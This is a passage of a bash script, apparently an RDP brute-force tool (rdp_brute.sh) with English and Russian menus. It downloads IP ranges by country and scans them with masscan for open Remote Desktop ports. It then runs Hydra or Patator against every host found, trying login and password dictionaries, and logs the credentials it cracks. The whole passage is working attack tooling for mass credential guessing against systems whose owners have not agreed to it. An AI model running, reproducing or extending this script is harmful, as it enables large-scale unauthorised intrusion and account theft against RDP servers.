echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "197" ]; then
curl http://services.ce3c.be/ciprg/?countrys=VANUATU |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Vanuatu://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "198" ]; then
curl http://services.ce3c.be/ciprg/?countrys=VENEZUELA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Venezuela://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "199" ]; then
curl http://services.ce3c.be/ciprg/?countrys=VIET+NAM |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Viet Nam://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "200" ]; then
curl http://services.ce3c.be/ciprg/?countrys=VIRGIN+ISLANDS+%28BRITISH%29 |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Virgin Islands (BRITISH)://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "201" ]; then
curl http://services.ce3c.be/ciprg/?countrys=VIRGIN+ISLANDS+%28U.S.%29 |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Virgin Islands (U.S.)://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "202" ]; then
curl http://services.ce3c.be/ciprg/?countrys=YEMEN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Yemen://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "203" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ZAMBIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Zambia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "204" ]; then
curl http://services.ce3c.be/ciprg/?countrys=ZIMBABWE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Zimbabwe://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""
echo -e "$green*The IP range is saved in the file $red $PWD/list. $colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




echo ""

MAINBRUTEMENUEN

if [ "$menuoption" = "5" ]; then
clear
CLEARALL
exit;
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
}

########################################################################################


#####################################MAINBRUTEMENURU##################################
MAINBRUTEMENURU ()
{
echo ""
echo -e "$green                                         Выбрать метод перебора..$colorbase"
echo -e "                +-----------------------------------------------------------------------+"
echo -e "                |        $grey 1.$yellow Ввести 1 логин и указать путь к файлу с паролями.$colorbase          |"; 
echo -e "                |        $grey 2.$yellow Указать путь к файлу с логинами и ввести 1 пароль.$colorbase         |";
echo -e "                |        $grey 3.$yellow Указать путь к файлам с логинами и паролями.$colorbase               |";
echo -e "                |        $grey 4.$yellow Приступить к перебору методом по умолчанию.$colorbase                |";
echo -e "                |        $grey 5.$yellow Перейти в Главное меню.$colorbase                                    |";
echo -e "                |        $red         Нажмите $aquamarine[Enter]$red для выхода из скрипта$colorbase                 |"
echo -e "                +-----------------------------------------------------------------------+"
read -p "                                             Выбор из меню : " brutmenu

if [ "$brutmenu" = "1" ]; then
echo -e "$aquamarine*******************************************************************************$green"
BRUTMENU1 (){
read -p "*Введите логин {administrator, admin & etc.} : " loginbrute
read -p "*Укажите путь к файлу со списком паролей {dict/john}: " passlist
}
while BRUTMENU1
do
if [[ -z $loginbrute || ! -s $passlist ]]; then
echo -e "\n$red***ОШИБКА! Неверно указан логин или файл с паролями$green"
else
break
echo ""
fi
done

clear
echo -e " $colorbase              +-----------------------------------------------------------------------+"   
echo -e "               |   $grey                          1.$yellow Hydra   9.3           $colorbase                 |";
echo -e "               |   $grey                          2.$yellow Patator 0.7$colorbase                            |";
echo -e "               +-----------------------------------------------------------------------+"
read -p "                                          Выберите брутфорсер : " btool
echo -e "$red-------------------------------------------------------------------------------"
if [ "$btool" = "1" ]; then
	clear

echo -e "                                            $green Запуск брутфорса$colorbase"
	
hydra -l $loginbrute -P $passlist -t 16 -vV -I -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

	TESTRESULTRU_H


else

clear
echo -e "                                            $green Запуск брутфорса$colorbase"
echo ""
echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] => $green"
echo -e "$yellow*Поставить на паузу/Снять с паузы  $aquamarine[P]=>[ENTER] => $green"


echo ""

python patator.py rdp_login host=FILE0 port=$port user=$loginbrute password=FILE1  0=open3389 1=$passlist -t 120 --max-retries=0 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=500-700 -l $PWD/Results
#python crowbar.py -b rdp -u $loginbrute -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
#hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

clear
TESTRESULTRU
./rdp_brute.sh
exit;
./rdp_brute.sh
fi
fi

if [ "$brutmenu" = "2" ]; then
echo -e "$aquamarine***************************************************************************************************$green"
BRUTMENU2 (){
read -p "*Укажите путь к файлу со списком логинов {dict/users}: " loginlist
read -p "*Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
}
while BRUTMENU2
do
if [[ -z $passbrute || ! -s $loginlist ]]; then
echo -e "\n$red***ОШИБКА! Неверно указан пароль или файл с логинами$green"
else
break
echo ""
fi 
done


clear
echo -e " $colorbase              +-----------------------------------------------------------------------+"   
echo -e "               |   $grey                          1.$yellow Hydra   9.3          $colorbase                  |";
echo -e "               |   $grey                          2.$yellow Patator 0.7$colorbase                            |";
echo -e "               +-----------------------------------------------------------------------+"
read -p "                                          Выберите брутфорсер : " btool
echo -e "$red-------------------------------------------------------------------------------"
if [ "$btool" = "1" ]; then
	clear

echo -e "                                            $green Запуск брутфорса$colorbase"
	
hydra -L $loginlist -p $passbrute  -t 16 -vV -I -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

	TESTRESULTRU_H


	else

clear
echo -e "                                            $green Запуск брутфорса$colorbase"
echo ""
echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
echo -e "$yellow*Поставить на паузу/Снять с паузы  $aquamarine[P]=>[ENTER] => $green"
echo ""

python patator.py rdp_login host=FILE0 port=$port user=FILE1 password=$passbrute 0=open3389 1=users -t 120 --max-retries=0 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=500-700 -l $PWD/Results
#python crowbar.py -b rdp -U $loginlist -c $passbrute -S $PWD/open
#hydra -L $loginlist -p $passbrute -vV -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

clear
TESTRESULTRU
./rdp_brute.sh
exit;
./rdp_brute.sh
fi
fi

if [ "$brutmenu" = "3" ]; then
echo -e "$aquamarine****************************************************************************************************$green"
BRUTEMENU3 () {
read -p "*Укажите путь к файлу со списком логинов {dict/users}: " loginlist
read -p "*Укажите путь к файлу со списком паролей {dict/john}: " passlist
}
while BRUTEMENU3
do
if [[ ! -s $passlist || ! -s $loginlist ]]; then
echo -e "\n$red***ОШИБКА! Неверно указан файл с логинами или с паролями$green"
else
break
echo ""
fi
done

clear
echo -e " $colorbase              +-----------------------------------------------------------------------+"   
echo -e "               |   $grey                          1.$yellow Hydra   9.3          $colorbase                  |";
echo -e "               |   $grey                          2.$yellow Patator 0.7$colorbase                            |";
echo -e "               +-----------------------------------------------------------------------+"
read -p "                                          Выберите брутфорсер : " btool
echo -e "$red-------------------------------------------------------------------------------"
if [ "$btool" = "1" ]; then
	clear

echo -e "                                            $green Запуск брутфорса$colorbase"
	
hydra -L $loginlist -P $passlist -vV -t 16 -I -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
	
	TESTRESULTRU_H

	else


clear
echo -e "                                            $green Запуск брутфорса$colorbase"
echo ""
echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
echo -e "$yellow*Поставить на паузу/Снять с паузы  $aquamarine[P]=>[ENTER] => $green"
echo ""

python patator.py rdp_login host=FILE0 port=$port user=FILE1  password=FILE2  0=open3389 1=$loginlist 2=$passlist -t 120 --max-retries=0 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=500-700 -l $PWD/Results
#python crowbar.py -b rdp -U $loginlist -C $passlist -S $PWD/open
#hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

clear
TESTRESULTRU
echo -e "$red Файл с целями пустой$colorbase"
sleep 2
./rdp_brute.sh
exit;
./rdp_brute.sh
fi
fi

if [ "$brutmenu" = "4" ]; then
clear
echo -e " $colorbase              +-----------------------------------------------------------------------+"   
echo -e "               |   $grey                          1.$yellow Hydra   9.3          $colorbase                  |";
echo -e "               |   $grey                          2.$yellow Patator 0.7$colorbase                            |";
echo -e "               +-----------------------------------------------------------------------+"
read -p "                                          Выберите брутфорсер : " btool
echo -e "$red-------------------------------------------------------------------------------"
if [ "$btool" = "1" ]; then
	clear

echo -e "                                            $green Запуск брутфорса$colorbase"
	
hydra -L $PWD/users -P $PWD/dict/pass -I -t 16 -vV -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

	
	TESTRESULTRU_H

	else

clear
echo -e "                                            $green Запуск брутфорса$colorbase"
echo ""
echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
echo -e "$yellow*Поставить на паузу/Снять с паузы  $aquamarine[P]=>[ENTER] => $green"
echo ""

python patator.py rdp_login host=FILE0 port=$port user=FILE1 password=FILE2 0=open3389 1=$PWD/users 2=$PWD/dict/pass 3=$port -t 120  --rate-limit=0 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=500-700 -l $PWD/Results
#python crowbar.py -b rdp -U $PWD/users  -C $PWD/dict/pass -S $PWD/open 
#hydra -L $PWD/users -P $PWD/dict/pass -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

echo ""
clear
TESTRESULTRU
./rdp_brute.sh
exit;
./rdp_brute.sh
fi
fi

if [ "$brutmenu" = "5" ]; then
echo ""
./src/rdp_brute.sh
exit;
./rdp_brute.sh
fi
}
######################################################################################
#####################################MAINBRUTEMENUEN##################################
MAINBRUTEMENUEN ()
{
echo ""
echo -e "$green                                                Select method$colorbase"
echo -e "                 +-----------------------------------------------------------------------+"
echo -e "                 |    $grey 1.$yellow Enter the login and enter the path to passwords dictionary$colorbase     |"; 
echo -e "                 |    $grey 2.$yellow Enter the path to logins dictionary and enter the password$colorbase     |";
echo -e "                 |    $grey 3.$yellow Enter the path to dictionaries with logins and  passwords$colorbase      |";
echo -e "                 |    $grey 4.$yellow Proceed to the brute force method by default$colorbase                   |";
echo -e "                 |    $grey 5.$yellow Return to Main menu$colorbase                                            |";
echo -e "                 |                        $red Press $aquamarine[Enter]$red to exit$colorbase                         |";
echo -e "                 +-----------------------------------------------------------------------+"
read -p "                                             Сhoose from a menu : " brutmenu

if [ "$brutmenu" = "1" ]; then
echo -e "$aquamarine*******************************************************************************$green"
BRUTMENUEN1 () {
read -p "*Enter username {administrator, admin & etc.} : " loginbrute
read -p "*Enter the path to the file with a list of passwords {dict/john}: " passlist
}
while BRUTMENUEN1
do
if [[ -z $loginbrute || ! -s $passlist ]]; then
echo -e "\n$red***ERROR! Incorrect login or password file$green"
else
break
echo ""
fi
done
clear

echo -e " $colorbase              +-----------------------------------------------------------------------+"   
echo -e "               |   $grey                          1.$yellow Hydra   9.3          $colorbase                  |";
echo -e "               |   $grey                          2.$yellow Patator 0.7$colorbase                            |";
echo -e "               +-----------------------------------------------------------------------+"
read -p "                                          Choice bruteforce tool : " btool
echo -e "$red-------------------------------------------------------------------------------"

if [ "$btool" = "1" ]; then
	clear

echo -e "                                         $green Start bruteforceing$colorbase"
	
hydra -l $loginbrute -P $passlist -t 16 -vV -I -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

	TESTRESULTEN_H


else

clear
echo -e "                                          $green Start bruteforceing"
echo ""
echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=>$green "
echo -e "$yellow*Pause/Unpause $aquamarine[P]=>[ENTER]=>$green "

echo ""

python patator.py rdp_login host=FILE0 port=$port user=$loginbrute password=FILE1 0=open3389 1=$passlist -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=500-700 -l $PWD/Results
#python crowbar.py -b rdp -u $loginbrute -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
#hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

clear
TESTRESULTEN
./rdp_brute.sh
exit;
./rdp_brute.sh
fi
fi


if [ "$brutmenu" = "2" ]; then
echo -e "$aquamarine*******************************************************************************$green"
BRUTEMENUEN2 () {
read -p "*Enter the path to username dictionary {dict/users}: " loginlist
read -p "*Enter the password {administrator, admin, 123456 & etc.} : " passbrute
}
while BRUTEMENUEN2
do
if [[ ! -s $loginlist || -z $passbrute ]];
then
echo -e "\n$red***ERROR! Incorrect file with login and password unknown$green"
else
break
echo ""
fi
done
clear

echo -e " $colorbase              +-----------------------------------------------------------------------+"   
echo -e "               |   $grey                          1.$yellow Hydra   9.3          $colorbase                  |";
echo -e "               |   $grey                          2.$yellow Patator 0.7$colorbase                            |";
echo -e "               +-----------------------------------------------------------------------+"
read -p "                                          Choice bruteforce tool : " btool
echo -e "$red-------------------------------------------------------------------------------"

if [ "$btool" = "1" ]; then
	clear

echo -e "                                           $green Start bruteforceing$colorbase"
	
hydra -L $loginlist -p $passbrute -t 16 -I -vV -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

	TESTRESULTEN_H


else

clear
echo -e "                                           $green Start bruteforceing"
echo ""
echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
echo -e "$yellow*Pause/Unpause $aquamarine[P]=>[ENTER]=>$green "
echo ""

python patator.py rdp_login host=FILE0 port=$port user=FILE1  password=$passbrute 0=open3389 1=users -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=500-700 -l $PWD/Results
#python crowbar.py -b rdp -U $loginlist -c $passbrute -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
#hydra -L $loginlist -p $passbrute -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

clear
TESTRESULTEN
./rdp_brute.sh
exit;
./rdp_brute.sh
fi
fi

if [ "$brutmenu" = "3" ]; then
echo -e "$aquamarine*******************************************************************************$green"
BRUTEMENU3 () {
read -p "*Enter the path to username dictionary {dict/users}: " loginlist
read -p "*Enter the path to passwords dictionary {dict/john}: " passlist
}
while BRUTEMENU3
do
if [[ ! -s $loginlist || ! -s $passlist ]]; then
echo -e "\n$red***ERROR! Incorrect file with logins and passwords file$green"
else
break
echo ""
fi
done
clear

echo -e " $colorbase              +-----------------------------------------------------------------------+"   
echo -e "               |   $grey                          1.$yellow Hydra   9.3          $colorbase                  |";
echo -e "               |   $grey                          2.$yellow Patator 0.7$colorbase                            |";
echo -e "               +-----------------------------------------------------------------------+"
read -p "                                          Choice bruteforce tool : " btool
echo -e "$red-------------------------------------------------------------------------------"

if [ "$btool" = "1" ]; then
	clear

echo -e "                                           $green Start bruteforceing$colorbase"
	
hydra -L $loginlist -P $passlist -t 16 -vV -I -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

	TESTRESULTEN_H


else

clear
echo -e "                                           $green Start bruteforceing"
echo ""
echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
echo -e "$yellow*Pause/Unpause $aquamarine[P]=>[ENTER]=>$green "
echo ""

python patator.py rdp_login host=FILE0 port=$port user=FILE1 password=FILE2 0=open3389 1=$loginlist 2=$passlist -t 75 --max-retries=2 --rate-limit=1 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=500-700 -l $PWD/Results
#python crowbar.py -b rdp -U $loginlist -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
#hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'

clear
TESTRESULTEN
./rdp_brute.sh
exit;
./rdp_brute.sh
fi
fi

if [ "$brutmenu" = "4" ]; then
clear

clear

echo -e " $colorbase              +-----------------------------------------------------------------------+"   
echo -e "               |   $grey                          1.$yellow Hydra   9.3          $colorbase                  |";
echo -e "               |   $grey                          2.$yellow Patator 0.7$colorbase                            |";
echo -e "               +-----------------------------------------------------------------------+"
read -p "                                          Choice bruteforce tool : " btool
echo -e "$red-------------------------------------------------------------------------------"
if [ "$btool" = "1" ]; then
	clear

